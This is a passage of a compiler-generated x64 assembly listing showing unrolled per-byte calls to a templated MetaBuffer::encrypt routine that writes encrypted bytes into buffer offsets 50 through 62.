  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	b8 01 00 00 00	 mov	 eax, 1
  009b7	48 6b c0 3a	 imul	 rax, rax, 58		; 0000003aH
  009bb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009c2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009c6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009cd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  009d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009d9	88 41 3b	 mov	 BYTE PTR [rcx+59], al
  009dc	b8 01 00 00 00	 mov	 eax, 1
  009e1	48 6b c0 3b	 imul	 rax, rax, 59		; 0000003bH
  009e5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009ec	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009f0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009f7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  009fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a03	88 41 3c	 mov	 BYTE PTR [rcx+60], al
  00a06	b8 01 00 00 00	 mov	 eax, 1
  00a0b	48 6b c0 3c	 imul	 rax, rax, 60		; 0000003cH
  00a0f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a16	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a21	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00a26	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a2d	88 41 3d	 mov	 BYTE PTR [rcx+61], al
  00a30	b8 01 00 00 00	 mov	 eax, 1
  00a35	48 6b c0 3d	 imul	 rax, rax, 61		; 0000003dH
  00a39	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a40	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a4b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00a50	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a57	88 41 3e	 mov	 BYTE PTR [rcx+62], al
  00a5a	b8 01 00 00 00	 mov	 eax, 1
  00a5f	48 6b c0 3e	 imul	 rax, rax, 62		; 0000003eH
  00a63	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a6a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a6e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
